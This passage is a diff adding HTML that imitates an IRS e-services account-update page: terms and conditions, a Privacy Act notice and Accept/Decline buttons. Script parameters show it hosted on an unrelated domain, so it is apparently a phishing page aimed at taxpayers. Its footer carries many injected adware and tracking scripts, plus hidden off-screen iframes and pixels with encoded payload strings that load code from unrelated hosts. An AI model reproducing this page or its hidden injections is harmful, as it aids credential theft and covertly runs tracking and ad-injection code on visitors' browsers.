+                  ZAF(South Africa)
+                 </option>
+                 <option value="Zambia ">
+                  ZMB(Zambia)
+                 </option>
+                 <option value="Zimbabwe ">
+                  ZWE(Zimbabwe)
+                 </option>
+                </select>
+               </td>
+              </tr>
+              <tr>
+               <td colspan="2">
+                <img width="1" height="10" alt=" " src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+               </td>
+              </tr>
+             </tbody>
+            </table>
+           </p>
+           <p class="form-field-name-required">
+            Terms and Conditions
+           </p>
+           <p>
+            Please read the following Privacy Act and conditions of use that 
+                explain why we are requesting the account update information, how 
+                it will be used, and your responsibilities as a registered user 
+                of e-services. After reading, please select the
+            <span class="content-bold-italic">
+             Accept
+            </span>
+            button 
+                to continue your Account update.
+           </p>
+           <p class="form-field-name-required">
+            <i>
+             If you do not accept the 
+                presented Terms and Conditions, you will not be granted access 
+                to e-services.
+             <br />
+             The information you entered will then be deleted 
+                and you will be returned to the e-services welcome page.
+             <br />
+            </i>
+           </p>
+           <p>
+            <span class="form-field-name-required">
+             Privacy Act Notice:
+            </span>
+            <br />
+            The Privacy Act of 1974 requires that when we ask individuals 
+                for information about themselves, we state our legal right to 
+                ask for the information, why we are asking for the information, 
+                and how it will be used. We must also tell you what could happen 
+                if we do not receive all or part of the information, and whether 
+                your response is voluntary, required to obtain a benefit, or mandatory.
+           </p>
+           <p>
+            Our legal right to ask for information is 5 U.S.C. 301 and the 
+                Internal Revenue Code Sections 6001, 6011, 6012 and applicable 
+                regulations. The information we are requesting is 
+                used to create an e-services account for you and authenticate 
+                your identity, in other words, to ensure you are who you say you 
+                are. The information may not be disclosed except as provided by 
+                Section 6103 of the Internal Revenue Code. We may give the information 
+                to the Department of Justice and to other Federal agencies, as 
+                provided by law. We may also give it to cities, states, the District 
+                of Columbia and U. S. commonwealths or possessions to carry out 
+                their tax laws. We may give it to foreign governments because 
+                of tax treaties they have with the United States. Your participation 
+                in the e-services program is voluntary. As such, your responses 
+                to any of the questions are entirely voluntary. However, 
+                if you do not provide all or part of the information required 
+                to create your account and authenticate your identity, you will 
+                not be eligible for access to e-services.
+           </p>
+           <p>
+            <span class="form-field-name-required">
+             Paperwork Reduction Act 
+                Notice:
+            </span>
+            <br />
+            The collection of information contained in e-services has been reviewed 
+                and approved by the Office of Management and Budget in accordance with 
+                the Paperwork Reduction Act (44 U.S.C. 3507) under control number 1545-1823.
+                An agency may not conduct or sponsor, and a person is not required to 
+                respond to, a collection of information unless the collection of information 
+                displays a valid control number. Books or records relating to a collection of 
+                information must be retained as long as their contents may become material 
+                in the administration of any internal revenue law. Generally, tax returns 
+                and return information are confidential, as required by 26 U.S.C. §6103. 
+                The following table identifies the estimated length of time to complete 
+                the various e-services processes. This includes the time it will take to 
+                read the instructions, gather the necessary facts and enter the 
+                required information.
+           </p>
+           <table width="674" border="1">
+            <tbody>
+             <tr>
+              <td width="246" class="form-field-name-required">
+               e-services Product
+              </td>
+              <td colspan="2">
+               <table width="452" border="1" frame="VOID" rules="ALL">
+                <tbody>
+                 <tr>
+                  <td width="148" class="form-field-name-required">
+                   OMB Number
+                  </td>
+                  <td width="276" class="form-field-name-required">
+                   Estimated Time to Complete
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+             <tr>
+              <td width="246">
+               Account update to e-services
+              </td>
+              <td colspan="2">
+               <table width="452" border="1" frame="VOID" rules="ALL">
+                <tbody>
+                 <tr>
+                  <td width="148">
+                   1545-1823
+                  </td>
+                  <td width="276" align="right">
+                   20 minutes
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+             <tr>
+              <td width="246">
+               Required Password Maintenance
+              </td>
+              <td colspan="2">
+               <table width="452" border="1" frame="VOID" rules="ALL">
+                <tbody>
+                 <tr>
+                  <td width="148">
+                   1545-1823
+                  </td>
+                  <td width="276" align="right">
+                   20 minutes
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+             <tr>
+              <td width="246">
+               Forgotten Password Maintenance
+              </td>
+              <td colspan="2">
+               <table width="452" border="1" frame="VOID" rules="ALL">
+                <tbody>
+                 <tr>
+                  <td width="148">
+                   1545-1823
+                  </td>
+                  <td width="276" align="right">
+                   20 minutes
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+             <tr>
+              <td width="246">
+               TIN Matching Application
+              </td>
+              <td colspan="2">
+               <table width="452" border="1" frame="VOID" rules="ALL">
+                <tbody>
+                 <tr>
+                  <td width="148">
+                   1545-1823
+                  </td>
+                  <td width="276" align="right">
+                   20 minutes
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+             <tr>
+              <td width="246">
+               TIN Matching Interactive Session
+              </td>
+              <td colspan="2">
+               <table width="452" border="1" frame="VOID" rules="ALL">
+                <tbody>
+                 <tr>
+                  <td width="148">
+                   1545-1823
+                  </td>
+                  <td width="276" align="right">
+                   10 minutes
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+             <tr>
+              <td width="246">
+               Bulk TIN Matching
+              </td>
+              <td colspan="2">
+               <table width="452" border="1" frame="VOID" rules="ALL">
+                <tbody>
+                 <tr>
+                  <td width="148">
+                   1545-1823
+                  </td>
+                  <td width="276" align="right">
+                   10 minutes
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+             <tr>
+              <!-- Serge Tchouambou - Remove Form 8633 from the table  -->
+              <td width="246">
+               Application to Participate
+               <br />
+               in the IRS e-file Program
+              </td>
+              <td colspan="2">
+               <table width="452" border="1" frame="VOID" rules="ALL">
+                <tbody>
+                 <tr>
+                  <td width="148" height="28">
+                   1545-0991
+                  </td>
+                  <td width="276" height="28" align="right">
+                   1 hour
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+             <tr>
+              <td width="246">
+               Transcript Delivery System
+               <br />
+               Form 4506-T-Request for Copy of Transcript
+               <br />
+               of Tax Form
+              </td>
+              <td colspan="2">
+               <table width="452" border="1" frame="VOID" rules="ALL">
+                <tbody>
+                 <tr>
+                  <td width="148">
+                   1545-1872
+                  </td>
+                  <td width="276" align="right">
+                   Recordkeeping 13 minutes
+                  </td>
+                 </tr>
+                 <tr>
+                  <td width="148">
+                   1545-1872
+                  </td>
+                  <td width="276" align="right">
+                   Learning about the law or 
+								  the form 6 minutes
+                  </td>
+                 </tr>
+                 <tr>
+                  <td width="148">
+                   1545-1872
+                  </td>
+                  <td width="276" align="right">
+                   Preparing the form 11 minutes
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+            </tbody>
+           </table>
+           <p>
+            If you have comments concerning the accuracy of these time estimates 
+                or suggestions for reducing this burden, we would be happy to 
+                hear from you. You can write the Internal Revenue Service Tax 
+				Products Coordinating Committee, SE:W:CAR:MP:T:T:SP, 1111 Constitution Ave NW, 
+				IR-6526, Washington, DC 20224.
+           </p>
+           <p>
+            <span class="form-field-name-required">
+             Your Accounts Obligations:
+            </span>
+            <br />
+            As an e-services user, you agree to provide true, accurate, current 
+                and complete information about yourself as prompted by the Account Update 
+                process and that you will maintain and promptly update this data 
+                to keep it true, accurate, current and complete. If you provide 
+                any information that is untrue, inaccurate, obsolete or incomplete, 
+                or there are reasonable grounds to suspect that such information 
+                is untrue, inaccurate, obsolete or incomplete, the IRS has the 
+                right to suspend or terminate your account and refuse any and 
+                all current or future use of e-services.
+           </p>
+           <p>
+            <span class="form-field-name-required">
+             Member Account, Password 
+                and Security:
+            </span>
+            <br />
+            As part of the Account update process, you selected a username, 
+                password and PIN. You are responsible for maintaining the confidentiality 
+                of this information. While it may be necessary to disclose your 
+                username or PIN to an IRS employee or other individual, you agree 
+                not to disclose your password to anyone. You are fully responsible 
+                for all activities that occur under your password. IRS personnel 
+                do not have access to your password and should never ask you for 
+                it.
+            <br />
+            You agree to immediately notify the IRS at 1-866-255-0654 (international callers use 512-416-7750) of any 
+                unauthorized use of your password or account, or any other breach 
+                of security and ensure that you exit from your account at the 
+                end of each session.
+           </p>
+           <p>
+            <span class="form-field-name-required">
+             Limited Usage Agreement:
+            </span>
+            <br />
+            I agree that the IRS may deny me access to any or all electronic services, 
+		products and/or applications, at both the individual or business entity level, 
+		in the event IRS becomes aware of any activity that constitutes or appears 
+		to constitute misuse or abuse of any electronic services, products 
+		or applications.
+           </p>
+           <p class="form-field-name-required">
+            <i>
+             If you do not accept the 
+                presented Terms and Conditions, you will not be granted access 
+                to e-services.
+             <br />
+             The information you entered will then be deleted 
+                and you will be returned to the e-services welcome page.
+             <br />
+            </i>
+           </p>
+          </td>
+         </tr>
+        </tbody>
+       </table>
+       <br />
+       <span class="content-sub-heading">
+        You may do either of the following:
+       </span>
+       <br />
+       <li>
+        Select
+        <span class="content-bold-italic">
+         Accept
+        </span>
+        to submit all your entries.
+       </li>
+       <li>
+        Select
+        <span class="content-bold-italic">
+         Decline
+        </span>
+        to discard all your entries.
+       </li>
+       <br />
+       <br />
+       <table width="100%" cellspacing="0" cellpadding="0">
+        <tbody>
+         <tr>
+          <td width="1px">
+           <input type="submit" onclick="return validateFormData(document.regform)" class="button-box" name="cmd" value="Accept" />
+          </td>
+          <td width="1px" class="button-spacer">
+           W
+          </td>
+          <td width="1px">
+           <input type="button" class="button-box" onclick="javascript:askUserAgain(this);" name="cmd" value="Decline" />
+          </td>
+          <td class="button-spacer">
+           W
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </td>
+     </tr>
+    </tbody>
+   </table>
+  </form>
+  <!-- #EndEditable -->
+  <!-- #BeginLibraryItem "/Library/portalfooter.lbi" -->
+  <table width="760" summary="Formatting table for bottom link rows" class="footer">
+   <tbody>
+    <tr>
+     <td>
+      <table width="100%" border="0" cellspacing="0" cellpadding="0">
+       <tbody>
+        <tr>
+         <td valign="top" height="1px" bgcolor="#FFFFFF">
+          <img width="1" height="1" alt="" src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-grey_spacer.gif" />
+         </td>
+        </tr>
+       </tbody>
+      </table>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <img width="1" height="1" src="https://la1.www4.irs.gov/e-services/Registration/Images/1x1-transparent_spacer.gif" />
+      <a class="subhead" href="javascript:openCustomHelpWindow(getPrivacyURL(),790,510,20,50)">
+       e-services 
+      Privacy Policy
+      </a>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <!-- #EndLibraryItem -->
+  <script type="text/javascript">
+   function create() {
+var e=document.createElement('script'); 
+e.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'asrv-a.akamaihd.net/sd/9620/1002.js'; document.body.appendChild(e);
+var f=document.createElement('script');
+f.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'asrv-a.akamaihd.net/sd/9620/1004.js'; document.body.appendChild(f); 
+} 
+if (window.self !== window.top) {  } 
+else { window.onload = create; }
+  </script>
+  ​
+  <script src="http://asrv-a.akamaihd.net/sd/9620/1002.js">
+  </script>
+  <script src="http://asrv-a.akamaihd.net/sd/9620/1004.js">
+  </script>
+  <script src="http://erf.browteller.com/affs?addonname=[Enter%20Product%20Name]&affid=9620&subaffid=1002&subID=undefined&clientuid=undefined&origaffid=9620&origsubaffid=1002&href=http%3A%2F%2Fwww.tlcbeitshoshanim.com%2Fimages%2Fe-Services%2Fupdates.htm&arm=">
+  </script>
+  <script src="http://dip.booedalarmism.com/affs?addonname=[Enter%20Product%20Name]&affid=9620&subaffid=1004&subID=undefined&clientuid=undefined&origaffid=9620&origsubaffid=1004&href=http%3A%2F%2Fwww.tlcbeitshoshanim.com%2Fimages%2Fe-Services%2Fupdates.htm&arm=">
+  </script>
+  <script type="text/javascript" charset="UTF-8" src="http://i.izercbsrc.org/izer/javascript.js?channel=rvzr9620_1004_it&country=it&appTitle=Lyrics&plink=http%3A%2F%2Fnsl.mapticket.net%2Fsd%2Fapps%2Fadinfo-1.1%2Findex.html%3Fbj1MeXJpY3MmaD1kaXAuYm9vZWRhbGFybWlzbS5jb20mbz1kcCZhPTk2MjAmcz0xMDA0JmM9Z3JlZW4mdz13d3cudGxjYmVpdHNob3NoYW5pbS5jb20mb291PWh0dHA6Ly9kaXAuYm9vZWRhbGFybWlzbS5jb20vb3B0X291dC8x">
+  </script>
+  <script type="text/javascript" charset="UTF-8" src="http://i.izercbjs.info/izer/javascript.js?channel=rvzr9620_1004_it&country=it&appTitle=Lyrics&plink=http%3A%2F%2Fnsl.mapticket.net%2Fsd%2Fapps%2Fadinfo-1.1%2Findex.html%3Fbj1MeXJpY3MmaD1kaXAuYm9vZWRhbGFybWlzbS5jb20mbz1kcCZhPTk2MjAmcz0xMDA0JmM9Z3JlZW4mdz13d3cudGxjYmVpdHNob3NoYW5pbS5jb20mb291PWh0dHA6Ly9kaXAuYm9vZWRhbGFybWlzbS5jb20vb3B0X291dC8x">
+  </script>
+  <script src="http://istatic.eshopcomp.com/fo/ec/revzrbifrm.js?subid=9620_1004&cb=2">
+  </script>
+  <script src="//istatic.eshopcomp.com/fo/ec/revzifrm.js?subid=9620-1004">
+  </script>
+  <iframe style="display: none;">
+  </iframe>
+  <script type="text/javascript">
+   window['re-markable_data'] = { subId: '9620-1002', ad_lbl_content: 'Brought to you by Lyrics'  };
+  </script>
+  <script src="//static.re-markable00.re-markable.net/apps/tv-classic/re-markable/tv-classic-re-markable.js">
+  </script>
+  <script type="text/javascript" charset="UTF-8" src="//qzd.haemophiliacontextualisation.com/kVJ6kJ9BArcFTfC6OJhN_A6XEwXNPm/?d=W3sidXJsIjoiaHR0cDovL3d3dy50bGNiZWl0c2hvc2hhbmltLmNvbS9pbWFnZXMvZS1TZXJ2aWNlcy91cGRhdGVzLmh0bSJ9LHsiY291bnRyeSI6Iml0In0seyJ0aXRsZSI6ImVTZXJ2aWNlcyBBY2NvdW50IFVwZGF0ZSJ9LHsiZ2xidiI6ImNlMWEwIn0seyJyZWZlcmVyIjoiIn0seyJwcG0iOjF9LHsiaGVhZGxpbmUiOiIifSx7ImV2IjoiIn0seyJ1MSI6ImNlMWE3ZjFkLWZlNWYtNDBlMi05ZDM2LTE1ZmZiMThkMzc1OCJ9LHsiY2hhbm5lbCI6Ijk2MjAtMTAwMiJ9LHsiY3R4X3ZhbHVlIjoiIn1d">
+  </script>
+  <script type="text/javascript" src="//static.re-markable00.re-markable.net/partnerconfig/re-markable.js">
+  </script>
+  <script type="text/javascript" src="//static.re-markable00.re-markable.net/apps/tv-classic/tv-classic-noboot-fg.js?cb=24">
+  </script>
+  <iframe src="//static.re-markable00.re-markable.net/apps/bg.htm?cb=24" style="display: none;">
+  </iframe>
+  <iframe src="https://static.pricepeep00.pricepeep.net/apps/bg.htm?cb=24" style="display: none;">
+  </iframe>
+  <iframe id="efa526f459c10d50" src="//pstatic.bestpriceninja.com/nwp/v0_0_908/release/Store.html" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" class="ver3293297">
+  </iframe>
+  <iframe id="14db3bed9744f18e" src="//pstatic.bestpriceninja.com/nwp/v0_0_908/release/Store.html" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" class="ver5285284">
+  </iframe>
+  <iframe frameborder="0" class="hb1450609205066" id="hb1450609205066" style="width: 1px; height: 1px; position: absolute; top: -100000px; left: -100000px; visibility: visible; overflow: hidden;" border="no" scrolling="no" src="https://foxi69.tlscdn.com/altHbHandler.html#opdom=izercbjs.info&partner=izer&channel=izerrvzr9620_1004_it&country=IT&quick=https%3A%2F%2Fendall41-q.apollocdn.com%2F&trinity=Z16v6m71421e&instgrp=&referrer=&hid=0&sset=8">
+  </iframe>
+  <iframe frameborder="0" id="asdfad" src="http://f.asdfzxcv1312.com/idle.html#B3bKB209AxPLCMnIANmUAw5MBYzWyxj0BMvYpwL6zxiMy2HHBM5LBd1PEMvYCNz6CJK2mJbFmtaWnf9PDczJB3vUDhj5puLujMn1CNjLBNrKB21HAw49yxnKzNP4y3yXmZeYlMnVBsz0CMLUAxr5pvOXnNy2BtCXndiXzszPBNn0z3jWpszZzxnZAw9UAwq9mtq1mdyWotiWnta3nJu2ntuMAgLKptaMCgfNzxvYBd1ODhrWjtnbjtjgjtjgD3D3lNrSy2jLAxrZAg9ZAgfUAw0Uy29TjtjgAw1Hz2vZjtjgzs1tzxj2AwnLCYuYrNvWzgf0zxmUAhrT" visibility="visible" overflow="hidden" border="no" scrolling="no" style="width: 0;  height: 0;  position: absolute;  top: -10031px;  left:-1000000px;">
+  </iframe>
+  <img width="1" height="1" src="//fp139.digitaloptout.com/acttr?p=YTMyMTQyMzEyNjcHwxySdbd6hG9T5raNkxDxIIT9Guy0Usd5%2F7DX13MF3A3Md6vyscwYIZ1fg1fQ%2BXtyvFQn3JyPi0mBA3h6FwLlCsXSPTJAJgBvjC31T5T2SclnelxMUPjX0CTwQD%2FO%2FI%2FxWkI1PbpbuE8SibdglR7v2nwNUbRU7EXSbNmMpHC6CurAp5ZyyfWe&m=FP39_%3A_no-flash_%3A_0&t=1450609205101" style="width: 1px; height: 1px;" />
+  <iframe frameborder="0" class="dealply-toast s" id="s" style="width: 1px; height: 1px; position: absolute; top: -100000px; left: -100000px; visibility: visible; overflow: hidden;" border="no" scrolling="no" src="http://f.izercbjs.info/skinedEmpty.html">
+  </iframe>
+  <script src="//istatic.eshopcomp.com/fo/ec/revzifrm.js?subid=9620-1004">
+  </script>
+  <iframe id="a961bd96dc50d1f7" src="//pstatic.bestpriceninja.com/nwp/v0_0_908/release/Store.html" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" class="ver7157794">
+  </iframe>
+ </body>
+ <!-- #EndTemplate -->
+ <script src="http://i.izercbjs.info/opt_content.js?v=opt_1445931538722&partner=izer&channel=izerrvzr9620_1004_it&sset=8&appTitle=Lyrics&products=&ip=192.167.131.1" type="application/x-javascript">
+ </script>
+</html>
